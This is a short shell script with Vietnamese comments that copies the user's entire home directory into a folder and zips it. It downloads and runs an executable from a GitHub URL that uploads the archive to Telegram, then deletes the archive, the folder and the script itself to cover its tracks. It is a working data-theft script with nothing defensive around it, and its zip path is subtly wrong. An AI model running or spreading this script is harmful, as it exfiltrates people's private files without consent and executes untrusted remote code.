
mkdir -p /home/$USER/dump
cd /home/$USER/dump

cp -r ~/* /home/$USER/dump/

zip -r dump.zip dump/

wget https://github.com/idontknow-CC/gigido/raw/main/linux_telegram_uploader
chmod +x linux_telegram_uploader
./linux_telegram_uploader -f dump.zip -c "Here are all copied files!"

# Chờ 15 giây
sleep 15

# Xóa các file còn lại trong thư mục dump
rm -rf dump/
rm dump.zip
rm telegram_uploader.sh

# Kết thúc
exit
